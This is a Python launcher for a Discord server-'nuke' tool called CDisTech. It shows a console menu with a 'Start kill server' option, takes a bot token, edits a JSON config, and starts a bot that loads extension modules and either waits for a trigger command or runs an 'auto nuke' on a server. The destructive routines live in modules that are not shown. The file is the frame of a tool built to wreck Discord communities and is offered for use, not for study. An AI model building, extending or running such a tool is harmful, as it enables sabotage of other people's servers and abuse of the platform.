import discord
from discord.ext.commands import Bot
from discord.ext import commands
from discord import app_commands


from colorama import init
import colorama

from files.txts import CDisTechTXTS

import asyncio
import json
import os
import string
import re


from config import environ

init()


class CrashBot(Bot):
    def __init__(self, command_prefix, **options):
        super(CrashBot, self).__init__(command_prefix, intents=discord.Intents.all(), **options)


    async def on_ready(self):
        if environ["config"]["commands"]["command_for_kill"] and environ["config"]["commands"]["command"] != "":
            print(f"""[CDisTech] Wait for command {self.command_prefix}{environ["config"]["commands"]["command"]} for nuke server""")
        
        else:
            print("[CDisTec] Auto nuke has on")


        try:
            for filename in os.listdir("./cogs"):
                if filename.endswith('.py') and filename != "config.py":
                    await self.load_extension(f'cogs.{filename[:-3]}')

            self.tree.copy_global_to(guild = discord.Object(id = 1125044915143987210))
            await self.tree.sync(guild = discord.Object(id = 1125044915143987210))
        except Exception as a: 
            print(a)
    
        

class Main():
    def __init__(self, *args ,**kwargs):
        super(Main,self).__init__(*args,**kwargs)

        self.item_to_select = {
            "start_kill":["1","Start kill server"],
            "check_cfg_file":["2", "Check config file"],
            "exit":["3","Exit"]
        }

        try:
            with open("./config.json") as cfg_file:
                self.config = json.load(cfg_file)
                environ["config"] = self.config
        
        except json.JSONDecodeError as err:
            raise json.JSONDecodeError("Bad config in CDisTech config.json", err.doc , err.pos)
        
        self.menu()



    # selection for menu
    def selectMenuOption(self):
        # selecting in menu
        self.select_input = input("[Menu] Select option (press enter to exit): ")

        if self.select_input in self.item_to_select["exit"] or self.select_input == "":
            exit(0)

        elif self.select_input in self.item_to_select["start_kill"]:
            token = input("[CDisTech] Input discord bot token (you can get him here https://discord.com/developers/applications): ")
            print("\b")
            
            self.bot = CrashBot(command_prefix= self.config["commands"]["command_prefix"])
            self.bot.run(token = token)
        
        elif self.select_input in self.item_to_select["check_cfg_file"]:
            self.openConfig()

        else:
            print("[CDisTech] Bad choise")
            self.selectMenuOption()
        
    # main menu
    def menu(self):
        os.system("cls")

        # send main menu txts
        print(CDisTechTXTS.TITLE)
        print("[CDisTech] Check the config for correct config, restart the programme if reconfigured")

        items = ""
        for item,value in self.item_to_select.items():
            pos = [x for x,y in self.item_to_select.items()].index(item)+1
            items += f"[+] {pos}. {value[1]}\n"

        print(f"""
        
[Menu]

{items}
""")
        self.selectMenuOption()


    def selectConfigMenu(self):
        self.select_config_input = input("[Config menu] Select option (press enter for back): ")

        # select config str
        if self.select_config_input == "":
            self.menu()

        elif self.select_config_input != "":
            for value in self.config_items:
                if self.select_config_input in self.config_items[value][1::]:
                    self.updateConfigFile(self.config_items[value])
                    break
        
        else:
            print("[CDisTech] Bad choise")
            self.selectConfigMenu()

    def updateConfigFile(self, item):
        os.system("cls")

        # updating config method
        print(f"""[CDisTech] Select new value for {item[2]}
[CDisTech] IF item is list user comma  and '' if you need comma in sentence
""")
        
        last_key = str(item[2].lower()).replace(' ', "_")

        self.new_value = input("[Menu] Input here new values: ")

        for x in self.config:
            if last_key in self.config[x]:
                
                # for bool
                if isinstance(self.config[x][last_key],bool):
                    self.config[x][last_key]  = json.loads(self.new_value.lower())

                # for list
                elif isinstance(self.config[x][last_key], list):
                    patterns =r'(?:\'([^\']*)\'|\"([^\"]*)\")|([^,]+)'
                    matches = re.findall(patterns, self.new_value)

                    result = []
                    for match in matches:
                        for group in match:
                            if group:
                                if group.strip() != "":
                                    result.append(group.strip())
                                    break 

                    self.config[x][last_key] = result
                
                # for str
                elif isinstance(self.config[x][last_key], str):
                    self.config[x][last_key] = self.new_value

                
                # update confgi file
                with open("./config.json", "w") as cfg_writer:
                    cfg_writer.write(str(json.dumps(self.config, indent= 4)))
                    cfg_writer.close()

                with open("./config.json") as cfg_file:
                    self.config = json.load(cfg_file)
                    environ["config"] = self.config

                break

        input("[Config] New value has benn successfully set-up")
        self.openConfig()

    def openConfig(self):
        os.system("cls")
        
        # new configuration
        self.config_items = {}
        
        item_pos =0

        for key in self.config:
            new_udner_config = {}

            value = self.config[key]

            for key2 in value:
                item_pos +=1
                name = str(str(key2).replace("_", " "))

                new_udner_config[key2] = [value[key2] , str(item_pos) , name.capitalize()]


            self.config_items.update(new_udner_config)

        # collect item for print
        items = ""
        
        for key in self.config:
            value = self.config[key]

            items += f"\n{str(key).capitalize()}\n{'='*20}\n"

            under_items = ""
            self.config[key]

            for key2 in self.config_items:
                pos = [keyx for keyx in self.config_items].index(key2)+1
                
                name = str(str(key2).replace("_", " "))

                if key2 in self.config[key]:
                    under_items += f"[+] {pos} {name.capitalize()}: {self.config_items[key2][0]}\n"
            
            items += under_items
                
        print(CDisTechTXTS.CONFIG)

        print(f"""
[Config menu]
              
{items}
""")


        self.selectConfigMenu()



if __name__ == "__main__":
    Main()

    



